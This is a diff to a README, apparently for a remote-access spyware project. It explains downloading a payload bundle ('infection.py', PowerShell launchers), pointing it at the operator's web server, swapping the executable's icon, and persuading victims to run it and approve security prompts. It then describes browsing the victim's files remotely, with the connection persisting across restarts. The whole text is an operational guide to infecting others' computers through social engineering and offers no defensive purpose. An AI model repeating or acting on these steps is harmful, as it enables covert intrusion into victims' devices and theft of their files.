@@ -43,10 +43,17 @@ So, make sure to copy the URL for later use.
 
 ## 2. Generating and Deploying the Payload
 * Install Python on your computer from the official website [python.org](https://www.python.org/downloads)
-* Download the project by either:
-  * Using git clone, or
-  * Downloading the ZIP file directly from GitHub https://github.com/PowerPizza/Explowrer-Spyware
-  * If you downloaded the ZIP file, extract it.
+
+* Downloading the ZIP file of target setup from https://raw.githubusercontent.com/PowerPizza/Explowerer-Server/master/backend/target_work/target_work.zip
+
+* Extract the zip files into a folder - there will be `infection.py` `launch1.ps1` `launch2.ps1` etc... files in it.
+
+* **(Optional)** If you want to change the icon of the generated `.exe` payload file, follow these steps:
+  1. Choose any image you'd like to use as the icon.
+  2. Convert the image to `.ico` format using any online file converter.
+  3. Replace the existing `target_icon.ico` file with your new icon file.
+  > Important: Make sure the new file is named exactly target_icon.ico
+
 
 * Open the `infection.py` file using any text editor you prefer.
 * Find the placeholder string `__PLACE_RENDER_URL_HERE__` and replace it with the URL of your web server (copied from Section 1).
@@ -82,3 +89,11 @@ Approve any other prompts that appear by selecting "Yes".
 
 You can now send this file to anyone.  
 Convince them to **right-click** on it, select **Run with PowerShell**, approve any security prompts by clicking **Yes**, and enter capital Y if prompted.
+
+
+# 3. Accessing the Target’s File Explorer
+Use the **Render.com** URL you copied in **Section 1** to open the web page where you can access the file explorer of the target device.
+
+Note: Target devices will appear in the menu only when they are powered on and connected to the internet.
+
+> If a target device restarts, the connection will automatically be re-established with your web server. So, there's no need to worry about restarts.
